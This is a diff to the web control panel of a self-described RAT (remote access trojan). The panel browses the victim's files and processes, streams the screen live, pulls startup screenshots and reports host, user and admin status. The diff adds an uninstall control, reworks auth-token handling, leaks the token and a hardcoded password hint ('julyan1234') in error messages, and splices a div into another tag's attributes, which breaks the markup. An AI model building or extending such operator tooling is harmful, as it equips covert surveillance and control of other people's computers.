@@ -52,8 +52,8 @@ input,select,textarea{font-family:inherit;}
 .main-title{display:flex;align-items:center;gap:8px;font-size:14px;font-weight:800;color:var(--text-main);font-family:'JetBrains Mono',monospace;text-transform:uppercase;}
 .main-title span{font-size:16px;font-weight:400;color:var(--text-muted);}
 .content-area{padding:24px;flex:1;display:flex;flex-direction:column;gap:20px;}
-.tab{display:none;animation:fadeIn 0.15s ease;}
-.tab.active{display:block;}
+.tab{display:none !important;}
+.tab.active{display:block !important;}
 @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
 
 /* GRID & CARDS */
@@ -730,7 +730,16 @@ html.no-anim *,html.no-anim *::before,html.no-anim *::after{animation:none !impo
     </div>
 
     <!-- ARTIFACTS -->
-    <div id="tab-artifacts" class="tab">
+    <div 
+            <div class="embed danger" style="margin-top:16px;">
+              <div class="embed-title">DANGER ZONE</div>
+              <div class="embed-body">
+                <p style="color:var(--text-muted);font-size:12px;margin-bottom:10px;">Remove RAT from this machine: persistence, files, exit process.</p>
+                <button class="btn btn-danger btn-full" type="button" onclick="uninstallRat()">UNINSTALL RAT FROM THIS PC</button>
+              </div>
+            </div>
+
+    id="tab-artifacts" class="tab">
       <div class="embed-row" style="margin-bottom:16px;gap:8px;">
         <button class="btn btn-outline btn-sm" onclick="loadArtifacts()">REFRESH</button>
       </div>
@@ -754,41 +763,68 @@ function toast(msg,type='success'){
 }
 async function api(path,body=''){
   try{
-    const r=await fetch(path,{method:'POST',headers:H,body});
-    if(r.status===401){toast('AUTH FAIL — re-login with julyan1234','error');return '';}
-    return await r.text();
-  }catch(e){toast('NETWORK ERROR','error');return 'Error';}
+    const headers=Object.assign({}, H, {'X-Auth': (window.TOKEN||TOKEN||'')});
+    const r=await fetch(path,{method:'POST',headers:headers,body:body||''});
+    const text=await r.text();
+    if(r.status===401){toast('AUTH FAIL — token='+(window.TOKEN||TOKEN||'(vide)'),'error');return '';}
+    if(!r.ok){toast('HTTP '+r.status+' '+path,'error');return '';}
+    return text;
+  }catch(e){toast('NETWORK '+path+' '+e.message,'error');return '';}
 }
 function switchTab(id,btn){
-  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
-  document.getElementById('tab-'+id).classList.add('active');
-  if(btn) btn.classList.add('active');
-  document.getElementById('tab-title').textContent=id.replace(/_/g,' ').toUpperCase();
-  if(id==='screen')connectWs();else disconnectWs();
-  if(id==='dashboard'){loadInfo();loadStartupSs();}
-  if(id==='processes')loadProcs();
-  if(id==='files')loadDir();
-  if(id==='network')loadNet();
-  if(id==='artifacts')loadArtifacts();
-  if(id==='states')loadStates();
+  try{
+    document.querySelectorAll('.tab').forEach(function(el){ el.classList.remove('active'); });
+    document.querySelectorAll('.nav-btn').forEach(function(b){ b.classList.remove('active'); });
+    var el=document.getElementById('tab-'+id);
+    if(!el){ toast('TAB MANQUANTE: '+id,'error'); return; }
+    el.classList.add('active');
+    if(btn) btn.classList.add('active');
+    var tt=document.getElementById('tab-title');
+    if(tt) tt.textContent=String(id).replace(/_/g,' ').toUpperCase();
+    if(id==='screen') connectWs(); else if(typeof disconnectWs==='function') disconnectWs();
+    if(id==='dashboard'){ loadInfo(); loadStartupSs(); }
+    if(id==='processes') loadProcs();
+    if(id==='files') loadDir();
+    if(id==='network') loadNet();
+    if(id==='artifacts') loadArtifacts();
+    if(id==='states') loadStates();
+  }catch(e){ console.error(e); toast('switchTab: '+e.message,'error'); }
 }
+window.switchTab = switchTab;
+async function uninstallRat(){
+  if(!confirm('UNINSTALL RAT on this PC? Persistence + files will be removed.')) return;
+  if(!confirm('Final confirm — agent will go offline.')) return;
+  toast('UNINSTALLING…','warn');
+  const r = await api('/uninstall');
+  toast(r||'sent','warn');
+  setTimeout(()=>{ try{ location.href='about:blank'; }catch(e){} }, 1500);
+}
+
 function setOpt(k,v){fetch('/set_opt',{method:'POST',headers:H,body:k+' '+v});}
 
-document.getElementById('vol-range').addEventListener('input',function(){document.getElementById('vol-val').textContent=this.value;});
+(function(){
+  var vr=document.getElementById('vol-range');
+  if(vr) vr.addEventListener('input',function(){
+    var vv=document.getElementById('vol-val');
+    if(vv) vv.textContent=this.value;
+  });
+})();
 
 async function loadInfo(){
   try{
-    const d=JSON.parse(await api('/info'));
-    document.getElementById('info-hostname').textContent=d.comp;
-    document.getElementById('info-user').textContent=d.user;
-    document.getElementById('info-os').textContent=d.os;
-    document.getElementById('info-admin').textContent=d.admin?'TRUE':'FALSE';
-    document.getElementById('info-ram').textContent=d.ramFree+' / '+d.ramTotal+' MB ('+d.ramPercent+'%)';
+    const raw=await api('/info');
+    if(!raw){ toast('INFO vide — auth/tunnel?','warn'); return; }
+    const d=JSON.parse(raw);
+    const set=(id,val)=>{ const n=document.getElementById(id); if(n) n.textContent=(val==null||val==='')?'-':val; };
+    set('info-hostname', d.comp||d.hostname);
+    set('info-user', d.user||d.username);
+    set('info-os', d.os);
+    set('info-admin', d.admin?'TRUE':'FALSE');
+    if(d.ramFree!=null) set('info-ram', d.ramFree+' / '+d.ramTotal+' MB ('+d.ramPercent+'%)');
     const u=d.uptimeSec||0;
-    document.getElementById('info-uptime').textContent=Math.floor(u/3600)+'h '+Math.floor((u%3600)/60)+'m';
-    document.getElementById('info-battery').textContent=d.battery===255?'AC':d.battery+'%';
-  }catch(e){}
+    set('info-uptime', Math.floor(u/3600)+'h '+Math.floor((u%3600)/60)+'m');
+    set('info-battery', d.battery===255?'AC':(d.battery+'%'));
+  }catch(e){ console.error(e); toast('INFO parse: '+e.message,'error'); }
 }
 async function loadStartupSs(){
   const r=await api('/startup_screenshot');
